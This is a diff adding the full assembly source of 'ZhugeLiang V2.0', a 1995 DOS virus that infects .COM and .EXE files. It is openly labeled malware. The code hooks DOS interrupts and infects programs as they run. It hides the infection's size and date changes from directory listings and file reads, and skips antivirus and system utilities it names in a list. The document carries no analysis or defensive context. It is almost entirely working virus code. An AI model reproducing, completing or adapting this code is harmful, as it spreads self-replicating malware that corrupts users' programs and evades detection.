@@ -1,0 +1,999 @@
+
+;               ZhugeLiang V2.0
+;                      by
+;               Zhuge Jin [TPVO]
+;
+; ZL20 is a polymorphic .COM and .EXE infector.  The virus calls int 21h
+; with ah=6b, and using its int 2ah hook, converts the function into
+; anything it wants.  This will fool some AV programs.  Even a program
+; that calls the original int 21h entrypoint will be stealthed.
+; There is anti-debugging code present.
+
+        .286
+        .MODEL TINY
+
+        .CODE
+
+        org 0000h
+
+vir_start:
+        int 01h
+        int 03h
+        jmp vir_disp
+
+fil_mode db ?
+
+int21h_:
+        popf
+int21h_a:
+          db 0eah
+int21h_ip dw ?
+int21h_cs dw ?
+
+oint21h_ip dw ?
+oint21h_cs dw ?
+
+int2fh_:
+          db 0eah
+int2fh_ip dw ?
+int2fh_cs dw ?
+
+pcb   dw ?
+      dw 0080h
+psp_1 dw ?
+      dw 005ch
+psp_2 dw ?
+      dw 006ch
+psp_3 dw ?
+
+handle dw ?
+
+org_time dw ?
+org_date dw ?
+org_size dw 0002h
+
+dpl:
+dpl_ax dw ?
+dpl_bx dw ?
+dpl_cx dw ?
+dpl_dx dw ?
+dpl_si dw ?
+dpl_di dw ?
+dpl_ds dw ?
+dpl_es dw ?
+       dw ?
+       dw ?
+       dw ?
+
+tmp_ax dw ?
+tmp_bx dw ?
+tmp_di dw ?
+tmp_es dw ?
+sta_sp dw ?
+sta_ss dw ?
+
+vir_disp:
+        mov di,0100h
+        mov bp,sp
+        mov si,ss:[bp-06h]
+        sub si,0003h
+        mov cx,OFFSET vir_end
+        push OFFSET start+0100h
+        cld
+        repz movsb
+        ret
+
+start:
+        mov si,0100h
+
+        mov ax,4b0fh
+        int 21h
+
+        mov ds:[si+OFFSET psp_1-OFFSET vir_start],ds
+        mov ds:[si+OFFSET psp_2-OFFSET vir_start],ds
+        mov ds:[si+OFFSET psp_3-OFFSET vir_start],ds
+
+        xor bx,bx
+        mov ds,bx
+
+        mov bl,21h*04h
+
+        mov ax,OFFSET vint21h
+        xchg ax,ds:[bx]
+        mov cs:[si+OFFSET int21h_ip-OFFSET vir_start],ax
+        mov cs:[si+OFFSET oint21h_ip-OFFSET vir_start],ax
+        mov ax,cs
+        add ax,0010h
+        push ax
+        mov word ptr ds:[bx+28h],OFFSET vint2ah
+        mov word ptr ds:[bx+28h+02h],ax
+        xchg ax,ds:[bx+02h]
+        mov cs:[si+OFFSET int21h_cs-OFFSET vir_start],ax
+        mov cs:[si+OFFSET oint21h_cs-OFFSET vir_start],ax
+
+        mov bl,2fh*04h
+
+        mov ax,OFFSET vint2fh
+        xchg ax,ds:[bx]
+        mov cs:[si+OFFSET int2fh_ip-OFFSET vir_start],ax
+        pop ax
+        xchg ax,ds:[bx+02h]
+        mov cs:[si+OFFSET int2fh_cs-OFFSET vir_start],ax
+
+        call get_org_int21h
+
+        cli
+        mov sp,OFFSET vir_end+0100h
+        sti
+
+        mov ax,6b0dh
+        mov bx,para_size
+        call int21h_0100h
+
+        xor di,di
+        mov es,es:[di+2ch]
+        mov al,00h
+        mov cx,8000h
+
+get_name:
+        repnz scasb
+        cmp al,es:[di]
+        loopnz get_name
+
+        add di,0003h
+
+        push es
+        pop ds
+
+        push cs
+        pop es
+
+        mov ax,4b00h
+        mov bx,OFFSET pcb+0100h
+        mov dx,di
+        call int21h_0100h
+
+        mov ax,6b10h
+        call int21h_0100h
+
+        push cs
+        pop ds
+
+        mov bx,cs
+        dec bx
+        mov es,bx
+
+        mov cx,0007h
+        mov di,0008h
+        mov si,OFFSET not_file+0102h
+        repz movsb
+
+        mov byte ptr es:[di],00h
+
+        push cs
+        pop es
+
+        mov ah,31h
+        mov dx,para_size
+
+int21h_0100h:
+        pushf
+        call dword ptr cs:[oint21h_ip+0100h]
+        ret
+
+get_org_int21h:
+        mov di,si
+        xor ax,ax
+        mov ds,ax
+        mov si,ds:[bx+05h]
+        mov ax,ds:[bx+07h]
+        mov ds,ax
+        lodsw
+        cmp ax,9090h
+        jnz chk_ent
+chk_jmp:
+        lodsb
+        cmp al,0ffh
+        jnz chk_jmp
+        lodsb
+        cmp al,2eh
+        jnz chk_jmp
+        lodsw
+        mov si,ax
+        lodsw
+        push ax
+        lodsw
+        pop si
+        mov ds,ax
+chk_ent:
+        cmp si,0f000h
+        jae chk_end
+        lodsb
+        cmp al,50h
+        jnz chk_ent
+        lodsw
+        cmp ax,0d88ch
+        jnz chk_ent
+        sub si,000bh
+        mov word ptr ds:[si],1e06h
+        mov word ptr ds:[si+02h],5755h
+        mov word ptr ds:[si+04h],5256h
+        mov word ptr ds:[si+06h],5351h
+        mov cs:[di+OFFSET oint21h_ip-OFFSET vir_start],si
+        mov cs:[di+OFFSET oint21h_cs-OFFSET vir_start],ds
+chk_int2ah:
+        cmp si,0f000h
+        jae chk_end
+        lodsb
+        cmp al,0cdh
+        jnz chk_int2ah
+        cmp byte ptr ds:[si],2ah
+        jnz chk_int2ah
+        inc byte ptr ds:[si]
+chk_end:
+        ret
+
+dir_stealth:
+        popf
+        call int21h
+        pushf
+        cmp al,0ffh
+        jz ds_ext
+        push ax
+        push bx
+        push es
+        mov ah,2fh
+        call int21h
+        cmp byte ptr es:[bx],0ffh
+        jnz ds_noex
+        add bx,0007h
+ds_noex:
+        mov ax,es:[bx+19h]
+        shr ah,01h
+        cmp ah,64h
+        jb ds_not
+        sub word ptr es:[bx+1dh],vir_size
+ds_not:
+        pop es
+        pop bx
+        pop ax
+ds_ext:
+        popf
+        retf 0002h
+
+find_stealth:
+        popf
+        call int21h
+        pushf
+        jc ds_ext
+        push ax
+        push bx
+        push es
+        mov ah,2fh
+        call int21h
+        mov ax,es:[bx+18h]
+        shr ah,01h
+        cmp ah,64h
+        jb ds_not
+        sub word ptr es:[bx+1ah],vir_size
+        jmp ds_not
+
+vint21h:
+        pushf
+
+        cmp ah,4ch
+        jz exit_stealth
+
+        cmp ax,4b0fh
+        jz run_org_prg
+
+        cmp ax,4b00h
+        jz vint21_jmp
+
+        test byte ptr cs:fil_mode,02h
+        jnz dos_int21h
+
+        cmp ah,11h
+        jz dir_stealth
+        cmp ah,12h
+        jz dir_stealth
+        cmp ah,4eh
+        jz find_stealth
+        cmp ah,4fh
+        jz find_stealth
+
+;       cmp ah,3fh
+;       jz read_stealth
+
+        cmp ah,40h
+        jz writ_stealth
+
+        cmp ax,4202h
+        jz size_stealth
+
+        cmp ax,5700h
+        jz date_stealth
+
+dos_int21h:
+        jmp int21h_
+
+exit_stealth:
+        mov byte ptr cs:fil_mode,00h
+        jmp dos_int21h
+
+vint21_jmp:
+        jmp vint21
+
+run_org_prg:
+        jmp run_org_com
+
+writ_stealth:
+        popf
+        push es
+        push di
+        push ax
+        pushf
+        call chk_me
+        jb rs_not
+        call is_command
+        jnz rs_not
+ws_it:
+        popf
+        pop ax
+        pop di
+        pop es
+        mov ax,cx
+        clc
+        retf 0002h
+
+size_stealth:
+        popf
+        push es
+        push di
+        push ax
+        pushf
+        call chk_me
+        jb rs_not
+        sub dx,vir_size
+        dec cx
+        popf
+        pop ax
+        pop di
+        pop es
+        call int21h
+        retf 0002h
+
+date_stealth:
+        popf
+        push es
+        push di
+        push ax
+        pushf
+        call chk_me
+        jb rs_not
+        call is_command
+        jz rs_not
+ts_it:
+        popf
+        pop ax
+        pop di
+        pop es
+        call int21h
+        pushf
+        sub dh,11001000b
+        popf
+        retf 0002h
+
+;read_stealth:
+;        popf
+;        push es
+;        push di
+;        push ax
+;        pushf
+;        call chk_me
+;        jb rs_not
+rs_it:
+        add word ptr es:[di+15h],vir_size
+        popf
+        pop ax
+        call int21h
+        pushf
+        sub word ptr es:[di+15h],vir_size
+        popf
+        pop di
+        pop es
+        retf 0002h
+rs_not:
+        popf
+        pop ax
+        pop di
+        pop es
+        jmp int21h_a
+
+run_org_com:
+        popf
+        mov di,0100h
+        mov si,vir_size+0100h
+        mov cx,ds:[di+OFFSET org_size-OFFSET vir_start]
+        push cx
+        repz movsb
+        pop cx
+        mov dx,cx
+        mov si,0100h
+        call dec_code
+        pop ax
+        pop ax
+        pop ax
+        mov di,0100h
+        cmp word ptr ds:[di],'ZM'
+        jz run_org_exe
+        push ds
+        push di
+        retf
+
+run_org_exe:
+        mov ax,ds:[di+08h]
+        shl ax,04h
+        sub cx,ax
+        mov si,ax
+        add si,di
+        mov ax,ds
+        add ax,0010h
+        add ax,ds:[di+0eh]
+        mov ss,ax
+        mov sp,ds:[di+10h]
+        mov ax,ds
+        add ax,0010h
+        add ax,ds:[di+16h]
+        mov dx,ds:[di+14h]
+        mov cs:tmp_ax,cx
+        mov cx,ds:[di+06h]
+        jcxz no_locate
+        mov bx,ds:[di+18h]
+re_locate:
+        mov bp,ds:[bx+di]
+        add es:[bp+si],ax
+        add bx,0004h
+        loop re_locate
+no_locate:
+        mov cx,cs:tmp_ax
+        repz movsb
+        push ax
+        push dx
+        retf
+
+vint21:
+        push ax
+        push bx
+        push cx
+        push dx
+        push di
+        push si
+        push bp
+        push ds
+        push es
+
+        push cs
+        pop es
+
+        xor bp,bp
+
+        mov ah,60h
+        mov di,OFFSET buffer
+        mov si,dx
+        call oint21h
+
+        push cs
+        pop ds
+
+        mov si,di
+        cld
+find_00h:
+        lodsb
+        cmp al,00h
+        jnz find_00h
+        sub si,0004h
+        lodsw
+
+        cmp ax,'OC'
+        jnz chk_exe_file
+        lodsb
+        cmp al,'M'
+        jnz jmp_ext
+        jmp infect_file
+
+chk_exe_file:
+        cmp ax,'XE'
+        jnz jmp_ext
+        lodsb
+        cmp al,'E'
+        jnz jmp_ext
+        jmp infect_file
+
+jmp_ext:
+        jmp vint21_ext
+
+infect_file:
+        call chk_not_file
+        jc vint21_ext
+
+        mov ax,6b00h
+        mov dx,di
+        call oint21h
+        jc jmp_ext
+
+        mov bx,0009h
+        mov es,bx
+        push word ptr es:[bx-09h]
+        push word ptr es:[bx-09h+02h]
+
+        mov word ptr es:[bx-09h],OFFSET vint24h
+        mov word ptr es:[bx-09h+02h],cs
+
+        mov word ptr es:[bx-09h+(2bh-24h)*04h],OFFSET vint2ah
+        mov word ptr es:[bx-09h+(2bh-24h)*04h+02h],cs
+
+        mov bx,ax
+        mov cs:[bp+OFFSET handle-OFFSET vir_start],bx
+
+        call get_sft
+
+        mov word ptr es:[di+02h],0002h
+
+        call it_me
+        jb not_infect
+
+close_file:
+        mov ax,6b01h
+        mov bx,cs:[bp+OFFSET handle-OFFSET vir_start]
+        call oint21h
+
+        mov bx,0009h
+        mov ds,bx
+        pop word ptr ds:[bx-09h+02h]
+        pop word ptr ds:[bx-09h]
+
+vint21_ext:
+        pop es
+        pop ds
+        pop bp
+        pop si
+        pop di
+        pop dx
+        pop cx
+        pop bx
+        pop ax
+        jmp int21h_
+
+not_infect:
+        cmp word ptr es:[di+13h],0000h
+        jnz close_file
+
+        mov cx,es:[di+11h]
+        mov cs:[bp+OFFSET org_size-OFFSET vir_start],cx
+        cmp cx,58000
+        ja close_file
+        cmp cx,1000
+        jb close_file
+
+        mov ah,48h
+        mov bx,1000h
+        call oint21h
+        jc close_file
+
+        mov ds,ax
+
+        push es
+        push ds
+        push cx
+
+        mov ax,6b02h
+        mov bx,cs:[bp+OFFSET handle-OFFSET vir_start]
+        xor dx,dx
+        call oint21h
+        jc free_mem
+
+        xchg cx,ax
+        xor si,si
+
+        cmp word ptr ds:[si],'ZM'
+        jnz not_mz
+        cmp word ptr ds:[si+06h],0010h
+        ja free_mem
+not_mz:
+
+        call enc_code
+
+        mov es:[di+15h],dx
+        mov es:[di+17h],dx
+
+not_exe:
+        push cs
+        pop ds
+
+        mov ah,45h
+        call oint21h
+        jc writ_vir
+
+        push ax
+
+        mov ax,6b01h
+        call oint21h
+
+        pop bx
+
+writ_vir:
+        mov cs:[bp+OFFSET handle-OFFSET vir_start],bx
+
+        mov dx,0b400h
+        mov ah,0fh
+        int 10h
+        cmp al,07h
+        jz scr_mono
+        mov dx,0bc00h
+scr_mono:
+        mov es,dx
+
+        push di
+        push bp
+
+        mov bx,0100h
+        mov cx,OFFSET vir_end
+        xor dx,dx
+
+        call sdfe
+
+        pop bp
+        pop di
+
+        mov bx,cs:[bp+OFFSET handle-OFFSET vir_start]
+
+        mov ax,6b03h
+        mov cx,vir_size
+        call oint21h
+
+        pop cx
+        pop ds
+
+        mov ax,6b03h
+        call oint21h
+
+        push ds
+        pop es
+
+        mov ah,49h
+        call oint21h
+
+        pop es
+        call set_date
+
+        jmp close_file
+
+free_mem:
+        pop cx
+        pop es
+
+        mov ah,49h
+        call oint21h
+
+        pop es
+
+        jmp close_file
+
+int21h:
+        pushf
+        call dword ptr cs:int21h_ip
+        ret
+
+oint21h:
+        mov cs:[bp+OFFSET dpl_ax-OFFSET vir_start],ax
+        mov cs:[bp+OFFSET dpl_bx-OFFSET vir_start],bx
+        mov cs:[bp+OFFSET dpl_cx-OFFSET vir_start],cx
+        mov cs:[bp+OFFSET dpl_dx-OFFSET vir_start],dx
+        mov cs:[bp+OFFSET dpl_si-OFFSET vir_start],si
+        mov cs:[bp+OFFSET dpl_di-OFFSET vir_start],di
+        mov cs:[bp+OFFSET dpl_ds-OFFSET vir_start],ds
+        mov cs:[bp+OFFSET dpl_es-OFFSET vir_start],es
+        push cs
+        pop ds
+        mov ax,5d00h
+        mov dx,OFFSET dpl
+        pushf
+        call dword ptr cs:[bp+OFFSET oint21h_ip-OFFSET vir_start]
+        ret
+
+int2fh:
+        pushf
+        call dword ptr cs:int2fh_ip
+        ret
+
+vint24h:
+        xor al,al
+        iret
+
+ste_not:
+        mov ax,cs:tmp_ax
+        mov bx,cs:tmp_bx
+        mov di,cs:tmp_di
+        mov es,cs:tmp_es
+        iret
+
+vint2ah_ext_40h:
+        cmp bl,6bh*02h
+        jnz vint2ah_ext
+        mov bl,3dh
+        add bl,al
+        add bl,bl
+vint2ah_ext:
+        iret
+
+vint2ah:
+        int 2ah
+
+        cmp ah,82h
+        jnz vint2ah_ext
+        cmp bl,7eh
+        jnz vint2ah_ext_40h
+        test byte ptr cs:fil_mode,02h
+        jnz vint2ah_ext
+
+        mov cs:tmp_ax,ax
+        mov cs:tmp_bx,bx
+        mov cs:tmp_di,di
+        mov cs:tmp_es,es
+
+        push ds
+        push si
+        mov ax,1218h
+        int 2fh
+        mov bx,ds:[si+02h]
+        mov cs:sta_sp,si
+        mov cs:sta_ss,ds
+        pop si
+        pop ds
+
+        call chk_me
+        jb ste_not
+        call is_command
+        jz ste_not
+
+ste_it:
+        add word ptr es:[di+15h],vir_size
+
+        push ds
+        push si
+        mov si,cs:sta_sp
+        mov ds,cs:sta_ss
+        mov ax,OFFSET dos_ret
+        xchg ds:[si+12h],ax
+        mov cs:sta_sp,ax
+        mov ax,cs
+        xchg ds:[si+14h],ax
+        mov cs:sta_ss,ax
+        pop si
+        pop ds
+        jmp ste_not
+
+dos_ret:
+        pushf
+        push ax
+        push cx
+        push dx
+        push di
+        push si
+        push es
+        jc read_err
+
+        call get_sft
+
+        sub word ptr es:[di+15h],vir_size
+
+        mov si,dx
+        mov dx,es:[di+11h]
+        call it_me
+        jb has_sub
+        sub dx,vir_size
+has_sub:
+        call dec_code
+
+read_err:
+        pop es
+        pop si
+        pop di
+        pop dx
+        pop cx
+        pop ax
+        push word ptr cs:sta_ss
+        push word ptr cs:sta_sp
+        iret
+
+vint2fh:
+        pushf
+
+        cmp ax,1216h
+        jnz dos_int2fh
+
+        popf
+
+        call int2fh
+        jc v2f_err
+
+        pushf
+
+        call it_me
+        jb v2f_sten
+
+        push cx
+        push si
+        push ds
+        push es
+        pop ds
+        push cs
+        pop es
+        mov si,di
+        mov di,OFFSET buffer+80h
+        push di
+        mov cx,0040h
+        cld
+        repz movsb
+        pop di
+        pop ds
+        pop si
+        pop cx
+
+        sub byte ptr es:[di+10h],11001000b
+        sub word ptr es:[di+11h],vir_size
+
+v2f_sten:
+        popf
+v2f_err:
+        retf 0002h
+dos_int2fh:
+        popf
+        jmp int2fh_
+
+chk_me:
+        call get_sft
+        call it_me
+        ret
+
+it_me:
+        push ax
+        mov ax,es:[di+0fh]
+        shr ah,01h
+        cmp ah,64h
+        pop ax
+        ret
+
+is_command:
+        push bx
+        push ds
+        mov ah,62h
+        int 21h
+        mov ds,bx
+        mov ax,ds:[0014h]
+        cmp ax,bx
+        pop ds
+        pop bx
+        ret
+
+get_sft:
+        push ax
+        push bx
+        mov ax,1220h
+        call int2fh
+        mov ax,1216h
+        xor bx,bx
+        mov bl,es:[di]
+        call int2fh
+        mov ax,es:[di+0dh]
+        mov cs:org_time,ax
+        mov ax,es:[di+0fh]
+        mov cs:org_date,ax
+        pop bx
+        pop ax
+        ret
+
+set_date:
+        push cs
+        pop ds
+        mov bx,cs:[bp+OFFSET handle-OFFSET vir_start]
+        mov ax,5701h
+        mov cx,cs:[bp+OFFSET org_time-OFFSET vir_start]
+        mov es:[di+0dh],ax
+        mov dx,cs:[bp+OFFSET org_date-OFFSET vir_start]
+        add dh,11001000b
+        call oint21h
+        ret
+
+chk_not_file:
+        std
+        lodsb
+        cmp al,'\'
+        jnz chk_not_file
+        cld
+        lodsw
+        push di
+        mov di,si
+        push di
+        mov si,OFFSET not_file
+        xor cx,cx
+chk_again:
+        pop di
+        push di
+        add si,cx
+        lodsw
+        cmp ax,0ffffh
+        jz chk_fa
+        xor cx,cx
+        mov cl,al
+        repz cmpsb
+        jnz chk_again
+        mov cs:[bp+OFFSET fil_mode-OFFSET vir_start],ah
+        test ah,01h
+        jz chk_fa
+        stc
+        jmp set_stc
+chk_fa:
+        clc
+set_stc:
+        pop di
+        pop di
+        ret
+
+not_file db 7,1,'COMMAND'
+         db 3,1,'IBM'
+         db 2,1,'TB'
+         db 6,1,'SETVER'
+         db 6,1,'MSCDEX'
+         db 6,2,'CHKDSK'
+         db 8,2,'SCANDISK'
+         db 5,3,'XCOPY'
+         db 6,3,'BACKUP'
+         db 8,3,'MSBACKUP'
+         db 5,3,'PKZIP'
+         db 3,2,'ARJ'
+         db 3,2,'LHA'
+         db 3,2,'RAR'
+         db 5,6,'TELIX'
+         db 5,6,'COMMO'
+         db 0ffh,0ffh
+
+
+enc_code:
+        lodsb
+        neg al
+        xor al,byte ptr cs:org_size
+        mov ds:[si-01h],al
+        loop enc_code
+        ret
+
+dec_code:
+        push cx
+dc_a:
+        lodsb
+        xor al,dl
+        neg al
+        mov ds:[si-01h],al
+        loop dc_a
+        pop cx
+        ret
+
+include sdfe.e20
+
+ver_msg db ' ZhugeLiang v2.0 '
+        db ' by Zhuge Jin in Taipei, 1995. '
+
+buffer  db 0100h dup (?)
+
+vir_end:
+
+para_size equ (OFFSET vir_end-OFFSET vir_start)/16+17
+vir_size equ 4824+1024+128
+
+        org vir_size
+
+        db 31h,0e2h
+
+        END vir_start
+
